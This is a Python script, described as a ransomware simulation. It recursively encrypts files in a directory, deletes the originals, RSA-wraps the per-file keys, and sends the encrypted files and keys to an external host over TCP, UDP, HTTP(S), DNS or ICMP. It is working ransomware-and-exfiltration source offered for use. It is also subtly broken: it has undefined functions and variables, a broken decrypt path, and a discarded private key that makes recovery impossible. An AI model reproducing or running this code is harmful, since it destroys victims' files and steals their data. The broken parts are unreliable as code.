import os
import sys
import logging
import argparse
import socket
import threading
import json
import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from base64 import b64encode, b64decode
from dnslib import DNSRecord, QTYPE, RR, TXT
from scapy.all import IP, ICMP, sr1

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def generate_symmetric_key():
    return Fernet.generate_key()

def generate_asymmetric_keys():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    return private_key, public_key

def encrypt_symmetric_key(symmetric_key, public_key):
    encrypted_key = public_key.encrypt(
        symmetric_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_key

def encrypt_file(file_path, symmetric_key):
    try:
        fernet = Fernet(symmetric_key)
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted_data = fernet.encrypt(data)
        with open(file_path + '.encrypted', 'wb') as f:
            f.write(encrypted_data)
        os.remove(file_path)
        logging.info(f"Encrypted {file_path}")
    except Exception as e:
        logging.error(f"Failed to encrypt {file_path}: {e}")

def decrypt_file(file_path, symmetric_key):
    try:
        fernet = Fernet(symmetric_key)
        with open(file_path, 'rb') as f:
            encrypted_data = f.read()
        decrypted_data = fernet.decrypt(encrypted_data)
        with open(file_path[:-10], 'wb') as f:
            f.write(decrypted_data)
        os.remove(file_path)
        logging.info(f"Decrypted {file_path}")
    except Exception as e:
        logging.error(f"Failed to decrypt {file_path}: {e}")

def exfiltrate_data(ip_address, port, protocol, data):
    if protocol == 'tcp':
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip_address, port))
            s.sendall(data)
    elif protocol == 'udp':
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(data, (ip_address, port))
    elif protocol == 'http':
        requests.post(f"http://{ip_address}:{port}", data=data)
    elif protocol == 'https':
        requests.post(f"https://{ip_address}:{port}", data=data)
    elif protocol == 'dns':
        query = DNSRecord.question("example.com", QTYPE.TXT)
        query.add_answer(RR("example.com", QTYPE.TXT, rdata=TXT(data)))
        response = query.send(ip_address, port=port)
    elif protocol == 'icmp':
        packet = IP(dst=ip_address)/ICMP()/data
        sr1(packet)
    else:
        logging.error(f"Unsupported protocol: {protocol}")
    logging.info(f"Exfiltrated data to {ip_address}:{port} using {protocol}")

def process_files(directory, public_key, action, exclude_list, exfil_ip, exfil_port, exfil_protocol, key_exfil_ip, key_exfil_port, key_exfil_protocol):
    encrypted_keys = []
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if any(excluded in file_path for excluded in exclude_list):
                logging.info(f"Skipping {file_path}")
                continue
            if action == 'encrypt' and not file.endswith('.encrypted'):
                symmetric_key = generate_symmetric_key()
                encrypt_file(file_path, symmetric_key)
                encrypted_key = encrypt_symmetric_key(symmetric_key, public_key)
                encrypted_keys.append(encrypted_key)
                if exfil_ip and exfil_port and exfil_protocol:
                    with open(file_path + '.encrypted', 'rb') as f:
                        encrypted_data = f.read()
                    data = b64encode(encrypted_data)
                    exfiltrate_data(exfil_ip, exfil_port, exfil_protocol, data)
            elif action == 'decrypt' and file.endswith('.encrypted'):
                decrypt_file(file_path, symmetric_key)
    
    if key_exfil_ip and key_exfil_port and key_exfil_protocol:
        for encrypted_key in encrypted_keys:
            exfiltrate_data(key_exfil_ip, key_exfil_port, key_exfil_protocol, b64encode(encrypted_key))

def main():
    parser = argparse.ArgumentParser(description="Simulate ransomware behavior by encrypting/decrypting files.")
    parser.add_argument('action', choices=['encrypt', 'decrypt'], help="Action to perform: encrypt or decrypt files.")
    parser.add_argument('directory', help="Directory to process files in.")
    parser.add_argument('--key-file', default='ransomware_key.key', help="File to save/load the encryption key.")
    parser.add_argument('--exclude-file', help="JSON file containing a list of files/directories to exclude.")
    parser.add_argument('--exfil-ip', help="External IP address to exfiltrate encrypted data to.")
    parser.add_argument('--exfil-port', type=int, help="Port to exfiltrate encrypted data to.")
    parser.add_argument('--exfil-protocol', choices=['tcp', 'udp', 'http', 'https', 'dns', 'icmp'], help="Protocol to use for data exfiltration.")
    parser.add_argument('--key-exfil-ip', help="External IP address to exfiltrate encrypted symmetric keys to.")
    parser.add_argument('--key-exfil-port', type=int, help="Port to exfiltrate encrypted symmetric keys to.")
    parser.add_argument('--key-exfil-protocol', choices=['tcp', 'udp', 'http', 'https', 'dns', 'icmp'], help="Protocol to use for key exfiltration.")
    
    args = parser.parse_args()

    exclude_list = []
    if args.exclude_file:
        try:
            with open(args.exclude_file, 'r') as file:
                exclude_list = json.load(file)
        except Exception as e:
            logging.error(f"Failed to load exclude file: {e}")
            sys.exit(1)

    private_key, public_key = generate_asymmetric_keys()
    
    if args.action == 'encrypt':
        process_files(args.directory, public_key, 'encrypt', exclude_list, args.exfil_ip, args.exfil_port, args.exfil_protocol, args.key_exfil_ip, args.key_exfil_port, args.key_exfil_protocol)
    elif args.action == 'decrypt':
        key = load_key(args.key_file)
        process_files(args.directory, public_key, 'decrypt', exclude_list)

if __name__ == "__main__":
    main()
